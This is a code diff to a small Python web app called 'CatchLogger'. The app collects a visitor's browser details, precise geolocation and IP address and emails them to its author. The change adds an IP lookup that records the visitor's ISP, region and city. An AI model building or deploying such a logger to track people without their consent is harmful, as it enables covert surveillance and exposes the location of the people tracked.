@@ -2,6 +2,7 @@ import os
 import sqlite3
 import smtplib
 import json
+import requests
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
 from bottle import *
@@ -17,13 +18,13 @@ def html(filename):
 def send_email(text): 
     fromaddr = "noreply.intschool@gmail.com"
     toaddr = "andtun@yandex.ru"
-    msg = MIMEMultipart('alternative')
+    msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
     msg['Subject'] = "CatchLogger results"
      
     body = text
-    msg.attach(MIMEText(body, 'html'))
+    msg.attach(MIMEText(body, 'plain'))
      
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
@@ -59,9 +60,10 @@ def obr():
     	d['lat'] = 'undefined'
     	d['long'] = 'undefined'
     	d['rad'] = "Okay"
-    
-    text = """By navigator: \n
-Browser: %s \n
+    APIipADDR = "http://ip-api.com/json/"+ip
+    ip_dic = json.loads(requests.get(APIipADDR).text)
+    text = """By navigator:
+Browser: %s
 Language: %s
 OS: %s
 
@@ -77,12 +79,14 @@ Location:
 latitude: %s
 longitude: %s
 Radius: %s
-Location link: <a href="http://catchlogger.herokuapp.com/locvar_access?lat=%s&lng=%s&rad=%s">here</a>
+Location link: http://catchlogger.herokuapp.com/locvar_access?lat=%s&lng=%s&rad=%s
 
 IP = %s
+Provider: %s
+Region, city: %s, %s
 
 ----
-CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], ip, d['lat'], d['long'], d['rad'])
+CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], d['lat'], d['long'], d['rad'], ip, ip_dic["org"], ip_dic["regionName"], ip_dic["city"])
     send_email(text)
     
 
@@ -140,9 +144,9 @@ def logo():
 def locvar():
     return static_file("locvar_storage.js", root='.')
 
-@error(404)
-def fff(error):
-    return html("404")
+#@error(404)
+#def fff(error):
+#    return html("404")
 
 @error(500)
 def fff(error):
